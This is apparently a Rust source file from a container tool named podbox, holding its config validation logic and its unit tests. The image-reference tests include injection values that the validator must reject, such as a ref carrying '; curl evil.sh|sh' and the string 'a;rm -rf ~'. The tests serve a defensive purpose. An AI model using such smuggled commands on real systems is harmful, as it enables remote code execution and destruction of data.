use anyhow::Result;

use crate::config::Config;
use crate::error::PodboxError;

mod caches;
#[cfg(feature = "cli")]
mod host;
#[cfg(feature = "cli")]
mod printing;
mod provision;
mod safety;
mod sections;
mod values;

pub use values::{
    is_bare_memory_digits, is_lowercase_image_name, is_valid_env_key, is_valid_image_ref,
    is_valid_memory, parse_duration_secs, parse_idle_timeout_secs, parse_provision_timeout_secs,
    validate_container_name,
};

/// Test-only query over the parse-warning gate.
#[cfg(all(test, feature = "cli"))]
pub(crate) fn note_was_seen(message: &str) -> bool {
    printing::was_noted(message)
}

/// [`printing::set_quiet`], for the command layer.
#[cfg(feature = "cli")]
pub fn set_parse_warnings_quiet(quiet: bool) {
    printing::set_quiet(quiet);
}

/// Current parse-warning quiet state, for save/restore around a scan.
#[cfg(feature = "cli")]
pub fn parse_warnings_quiet() -> bool {
    printing::quiet()
}

/// Print one diagnostic through the once-per-process gate (used by both
/// [`Config::validate`] and the lenient cleanup loader).
#[cfg(feature = "cli")]
pub(crate) fn note_parse_warning(message: impl Into<String>) {
    printing::note(message);
}

impl Config {
    pub fn validate(&self) -> Result<()> {
        let validated = self.validate_with_warnings();
        // The wasm/Studio path uses `validate_with_warnings` directly: the
        // print macros panic on wasm targets, so only the CLI may print.
        #[cfg(feature = "cli")]
        for warning in &validated.0 {
            note_parse_warning(warning.clone());
        }
        validated.1
    }

    /// Validate, collecting non-fatal diagnostics alongside the verdict.
    /// Warnings are produced independently of the error outcome, matching
    /// the CLI (which prints them even when validation fails).
    pub fn validate_with_warnings(&self) -> (Vec<String>, Result<()>) {
        // Reshaping decisions (defaults, migrations) speak through the same
        // warnings channel as validation, so every surface that shows
        // diagnostics shows the notices too.
        let mut warnings: Vec<String> = self.parse_notices.clone();
        let mut errors: Vec<String> = Vec::new();

        sections::image::validate_image(self, &mut errors);

        sections::container::validate_container(self, &mut errors);
        errors.extend(safety::validate_safety(self));
        errors.extend(provision::validate_provision(&self.provision));
        errors.extend(caches::validate_caches(self));
        // Host-fact checks belong to the CLI only: the Studio (wasm) has no
        // host to ask, and every path would read as "missing" there.
        #[cfg(feature = "cli")]
        warnings.extend(host::host_path_warnings(self));
        sections::container::validate_env_forward_and_services(self, &mut errors);

        // `security.userns` is a `UsernsMode` enum: unknown spellings fail
        // at parse time with the valid list, so there is nothing to
        // re-check here.

        sections::network::validate_network(self, &mut errors);

        sections::integration::validate_host_exec_allowlist(self, &mut errors);

        sections::security::validate_secrets(self, &mut errors);

        sections::image::validate_packages(self, &mut errors);

        sections::lifecycle::validate_on_stop(self, &mut warnings);

        sections::integration::validate_host_exec_enabled(self, &mut errors);

        sections::integration::validate_dbus_talk(self, &mut warnings);

        sections::integration::validate_xdg_open(self, &mut errors);

        sections::integration::validate_dbus_switch(self, &mut errors);

        sections::lifecycle::validate_durations(self, &mut errors);

        if errors.is_empty() {
            (warnings, Ok(()))
        } else {
            (
                warnings,
                Err(PodboxError::ConfigValidationFailed {
                    details: errors.join("\n  - "),
                }
                .into()),
            )
        }
    }
}

#[cfg(test)]
mod name_tests {
    use super::{is_lowercase_image_name, validate_container_name};

    #[test]
    fn image_names_must_be_lowercase() {
        assert!(is_lowercase_image_name("dev-box_2"));
        assert!(!is_lowercase_image_name("Dev"));
        // Container names may keep their case.
        assert!(validate_container_name("container", "Dev").is_ok());
    }

    #[test]
    fn rejects_names_unsafe_as_paths_or_flags() {
        for bad in [
            ".",
            "..",
            "-x",
            "a/b",
            "",
            "a b",
            ".hidden",
            "a\0b",
            "tab\tname",
        ] {
            assert!(
                validate_container_name("container", bad).is_err(),
                "should reject {bad:?}"
            );
        }
    }

    #[test]
    fn accepts_ordinary_names() {
        for good in ["dev", "my-box_2", "a.b", "a..b", "Work", "9lives"] {
            assert!(
                validate_container_name("container", good).is_ok(),
                "should accept {good:?}"
            );
        }
    }

    #[test]
    fn enforces_length_limit() {
        assert!(validate_container_name("container", &"a".repeat(63)).is_ok());
        assert!(validate_container_name("container", &"a".repeat(64)).is_err());
    }
}

#[cfg(test)]
mod numeric_duration_tests {
    use super::parse_duration_secs;
    use crate::config::Config;

    fn minimal(image_extra: &str, container_extra: &str, tail: &str) -> String {
        format!(
            "[image]\nbase = \"fedora:41\"\nname = \"env\"\n{image_extra}\
             [container]\nname = \"env\"\nhome = \"~/env\"\n{container_extra}\
             {tail}\n"
        )
    }

    #[test]
    fn valid_durations_parse() {
        assert_eq!(parse_duration_secs("90s").unwrap(), 90);
        assert_eq!(parse_duration_secs("5m").unwrap(), 300);
        assert_eq!(parse_duration_secs("1h").unwrap(), 3600);
        assert_eq!(parse_duration_secs(" 10s ").unwrap(), 10);
    }

    #[test]
    fn trailing_junk_and_empty_are_rejected() {
        for bad in ["5mx", "m5", "", "off", "5", "0s", "500ms", "-5s"] {
            assert!(parse_duration_secs(bad).is_err(), "should reject {bad:?}");
        }
    }

    #[test]
    fn non_finite_and_non_positive_cpus_are_rejected() {
        for bad in ["NaN", "inf", "-inf", "-1", "0", "0.0", "999999"] {
            let err = Config::parse(&minimal("", &format!("cpus = \"{bad}\"\n"), ""))
                .expect_err(&format!("cpus = {bad:?} must fail validation"));
            assert!(
                err.to_string().contains("container.cpus"),
                "error should name the field: {err}"
            );
        }
    }

    #[test]
    fn ordinary_cpus_are_accepted() {
        for good in ["2.0", "0.5", "16"] {
            Config::parse(&minimal("", &format!("cpus = \"{good}\"\n"), ""))
                .unwrap_or_else(|_| panic!("cpus = {good:?} should validate"));
        }
    }

    #[test]
    fn idle_timeout_with_trailing_junk_is_rejected() {
        let err = Config::parse(&minimal("", "", "[lifecycle]\nidle_timeout = \"5mx\"\n"))
            .expect_err("idle_timeout with trailing junk must fail");
        assert!(err.to_string().contains("lifecycle.idle_timeout"), "{err}");
        Config::parse(&minimal("", "", "[lifecycle]\nidle_timeout = \"5m\"\n"))
            .expect("a plain duration should validate");
    }

    #[test]
    fn pull_retry_delay_is_duration_checked() {
        let err = Config::parse(&minimal("pull_retry_delay = \"5x\"\n", "", ""))
            .expect_err("pull_retry_delay with bad suffix must fail");
        assert!(err.to_string().contains("image.pull_retry_delay"), "{err}");
    }
}

#[cfg(test)]
mod env_key_tests {
    use super::is_valid_env_key;
    use crate::config::Config;

    /// Host-path warnings fire on missing paths, and never turn into
    /// errors: a portable definition must still validate on a host that
    /// lacks the binary or directory.
    #[test]
    fn missing_host_paths_warn_without_failing() {
        let cfg = Config::parse(
            &(base()
                + "[integration.host_exec]\nenabled = true\n\
                  [integration.host_exec.allowlist]\n\
                  ghost = \"/nonexistent/bin/ghost\"\n\
                  [[storage.host_caches.custom]]\n\
                  name = \"zap\"\nhost_path = \"/nonexistent/zap\"\ncontainer_path = \"~/.cache/zap\"\n\
                  [dotfiles]\nsource = \"host:/nonexistent/dots\"\n"),
        )
        .unwrap();
        let (warnings, verdict) = cfg.validate_with_warnings();
        assert!(
            verdict.is_ok(),
            "host facts must not fail validation: {verdict:?}"
        );
        assert!(
            warnings
                .iter()
                .any(|w| w.contains("ghost") && w.contains("/nonexistent/bin/ghost")),
            "{warnings:?}"
        );
        assert!(
            warnings
                .iter()
                .any(|w| w.contains("storage.host_caches.custom.zap")),
            "{warnings:?}"
        );
        assert!(
            warnings.iter().any(|w| w.contains("dotfiles.source")),
            "{warnings:?}"
        );
    }

    /// Paths that do exist stay silent: the common case must not nag.
    #[test]
    fn present_host_paths_are_silent() {
        let cfg = Config::parse(
            &(base()
                + "[integration.host_exec]\nenabled = true\n\
                  [integration.host_exec.allowlist]\n\
                  sh = \"/bin/sh\"\n"),
        )
        .unwrap();
        let (warnings, _) = cfg.validate_with_warnings();
        assert!(
            !warnings.iter().any(|w| w.contains("host_exec")),
            "an existing binary must not warn: {warnings:?}"
        );
    }

    fn base() -> String {
        "[image]\nbase = \"fedora:41\"\nname = \"env\"\n\
         [container]\nname = \"env\"\nhome = \"~/env\"\n"
            .to_string()
    }

    #[test]
    fn key_grammar() {
        for bad in ["1ABC", "A-B", "Ä", "", "A B", "A=B"] {
            assert!(!is_valid_env_key(bad), "should reject {bad:?}");
        }
        for good in ["_A1", "PATH", "_", "A1_b2"] {
            assert!(is_valid_env_key(good), "should accept {good:?}");
        }
    }

    #[test]
    fn container_env_values_are_checked() {
        let err = Config::parse(&(base() + "[container.env]\n1ABC = \"x\"\n"))
            .expect_err("bad container.env key must fail");
        assert!(err.to_string().contains("container.env"), "{err}");
    }

    #[test]
    fn container_env_forward_patterns_are_checked() {
        let err = Config::parse(&(base() + "[container.env]\nforward = [\"1ABC\"]\n"))
            .expect_err("bad forward pattern must fail");
        assert!(err.to_string().contains("container.env.forward"), "{err}");
        Config::parse(&(base() + "[container.env]\nforward = [\"FOO_*\"]\n"))
            .expect("PREFIX_* forwards should validate");
    }

    #[test]
    fn service_env_is_checked() {
        let err = Config::parse(
            &(base()
                + "[container.services.web]\ncommand = \"x\"\n[container.services.web.env]\nA-B = \"x\"\n"),
        )
        .expect_err("bad service env key must fail");
        assert!(
            err.to_string().contains("container.services.web.env"),
            "{err}"
        );
    }

    #[test]
    fn provision_env_is_checked() {
        let err = Config::parse(
            &(base() + "[[provision]]\nname = \"step\"\nrun = \"echo\"\n[provision.env]\n\"Ä\" = \"x\"\n"),
        )
        .expect_err("bad provision env key must fail");
        assert!(err.to_string().contains("provision[0].env"), "{err}");
    }

    #[test]
    fn systemd_secret_targets_are_checked() {
        let err = Config::parse(
            &(base()
                + "[[security.secrets]]\nname = \"tok\"\nsource = \"systemd\"\npath = \"/run/x\"\ntype = \"env\"\ntarget = \"1ABC\"\n"),
        )
        .expect_err("bad secret target must fail");
        assert!(
            err.to_string().contains("security.secrets[0].target"),
            "{err}"
        );
    }
}

#[cfg(test)]
mod image_ref_tests {
    use super::is_valid_image_ref;
    use crate::config::Config;

    #[test]
    fn valid_refs_are_accepted() {
        for good in [
            "fedora:41",
            "fedora",
            "dev-latest",
            "ubuntu:22.04",
            "ghcr.io/bethropolis/podbox:dev-latest",
            "ghcr.io/a/b:1",
            "localhost:5000/mybox:latest",
            "docker.io/library/archlinux:latest",
            "alpine:3.20",
            "myrepo/myimage@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
            "ghcr.io/a/b:1@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
        ] {
            assert!(is_valid_image_ref(good), "should accept {good:?}");
        }
    }

    #[test]
    fn shell_characters_and_malformed_refs_are_rejected() {
        for bad in [
            "",
            " ",
            "ghcr.io/a/b:1 --name x; curl evil.sh|sh #",
            "a;rm -rf ~",
            "$(evil)",
            "`evil`",
            "a'b",
            "a\"b",
            "a/b\\c",
            "UPPER/repo:tag",
            "a//b",
            "/a",
            "a/",
            ":tag",
            "a:",
            "-bad/x",
            "a:b:c",
            "a@sha256:xyz",
            "a@md5:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
            "a..b/c",
        ] {
            assert!(!is_valid_image_ref(bad), "should reject {bad:?}");
        }
    }

    #[test]
    fn crafted_share_link_ref_fails_validation() {
        let toml = "[image]\nbase = \"fedora:41\"\nname = \"env\"\nimage = \"ghcr.io/a/b:1 --name x; curl evil.sh|sh #\"\n[container]\nname = \"env\"\nhome = \"~/env\"\n";
        let err = Config::parse(toml).expect_err("crafted ref must fail validation");
        assert!(err.to_string().contains("image.image"), "{err}");
    }
}
